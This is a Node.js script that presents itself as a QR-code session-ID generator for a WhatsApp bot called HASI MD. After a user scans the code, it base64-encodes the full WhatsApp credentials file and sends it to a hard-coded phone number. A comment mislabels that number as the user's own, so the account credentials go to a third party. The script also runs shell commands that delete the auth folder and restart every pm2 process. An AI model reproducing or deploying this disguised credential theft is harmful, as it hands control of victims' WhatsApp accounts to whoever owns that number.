const fs   = require("fs-extra");
const axios = require('axios');
const pino = require("pino");
const express = require('express');
const QRCode = require('qrcode') ;
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || 3000; // Choisissez un port en fonction de vos besoins






  fs.emptyDirSync(__dirname + '/auth_info_baileys');

 
  
setTimeout(() => {
  const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore } = require("@sampandey001/baileys");
 
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  async function sᴜʜᴀɪʟ_ʙᴀɪʟᴇʏs_ǫʀ() {
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
    try {
      let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
      session.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;
          

        if (connection == "open")
        {
          await delay(500);
          let user = session.user.id;          // User = Number of that user who just Scanned the Qr

//===========================================================================================
//===============================  SESSION ID   =============================================
//===========================================================================================
          let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json') //GETTING CREDS FROM CREDS.json TO GENERATE SESSION ID 
          c = Buffer.from(unique).toString('base64'); // CHANGE 'base64' ACCORDING TO YOUR NEEDS 
          console.log('Good')
   

let cc = `Thanks for Chosing HASI MD  *. 🔰
  ❲❒❳ Auther:CH HASEEB
  ❲❒❳ Repo: https://github.com/chhaseeb47/HASI-MD
  ❲❒❳ Visit For Tutorial https://www.Youtube.com/c/mhmodsofc
  ❲❒❳ Group: https://chat.whatsapp.com/G4FBtLiaB2f84hkT87LKZ4
`;

          let session_id = await session.sendMessage('923407472645@s.whatsapp.net', { text: c });      //SENDING 'base64' SESSION ID TO USER NUMBER
          await session.sendMessage('923407472645@s.whatsapp.net', { text: cc } , { quoted : session_id });
          await require('child_process').exec('rm -rf auth_info_baileys')     //CLEAR 'auth_info_baileys' SO THAT NEXT TIME IT CLEARED FOR SCANNING ;
          
           exec('pm2 restart all', (error, stdout, stderr) => {
      if (error) {
        console.error(`Erreur lors de l'exécution de la commande : ${error.message}`);
        
      } 
    })   // STOPPING PROCESS AFTER GETTING SESSION ID
        }
        session.ev.on('creds.update', saveCreds)
       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { sᴜʜᴀɪʟ_ʙᴀɪʟᴇʏs_ǫʀ(); } // IF ANY ERROR< THEN PRINT QR AGAIN
     
      // let data = null 

       function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }
      
      // Utilisation de la fonction delay avec un délai de 5 secondes (5000 millisecondes)
      async function exampleUsage() {
        console.log('Début de l\'attente');
        await delay(5000);
        console.log('Fin de l\'attente de 5 secondes');
      }
      
      // Appel de la fonction d'exemple
      exampleUsage();
      

      try {
         
        QRCode.toDataURL(qr, async function (err, url) {
             
            try {
                // Lien de l'image que vous souhaitez télécharger
              //  const lienImage = 'https://example.com/image.jpg';
            
                // Utiliser Axios pour télécharger l'image depuis le lien
                const response = await axios.get(url, { responseType: 'arraybuffer' });
            
                // Chemin du répertoire où vous souhaitez sauvegarder l'image
                const repertoire = './logo';
            
                // Vérifier si le répertoire existe, sinon le créer
                if (!fs.existsSync(repertoire)) {
                  fs.mkdirSync(repertoire, { recursive: true });
                }
            
                // Chemin complet du fichier image
                const cheminImage = `${repertoire}/qr.jpg`;
            
                // Sauvegarder l'image téléchargée localement
                fs.writeFileSync(cheminImage, Buffer.from(response.data));
            
                console.log(`Image téléchargée enregistrée avec succès dans : ${cheminImage}`);
              } catch (error) {
                console.error('Erreur :', error);
              }

          })
      } catch {
         data = 'not found'
      }

    
    });
    } catch (err) {console.log(err); await require('child_process').exec('rm -rf auth_info_baileys');}
  }
  sᴜʜᴀɪʟ_ʙᴀɪʟᴇʏs_ǫʀ();
}, 3000)


const path = require('path');


app.get( '/qrcode' , async (req , res) => {


    const htmlPath = path.join(__dirname, 'logo/qr.jpg');

    res.sendFile(htmlPath);


})



/*let qr = null ;

 conn.on('qr' , code => {
  
     qr = code

 } )

app.get( '/qrcode' , async (req , res) => {

   if (!qr) {
      res.send('not ready') ;

      return null ;
   }

   var data = await QRCode.toDataURL(qr) ;

      data = data.split(',')[1] ;

     var img = Buffer.from(data , 'base64') ;

     console.log(img) ;
    

})
  

*/


app.listen(port, () => {
    console.log(`Serveur Express démarré sur le port ${port}`);
  });


 

 

 
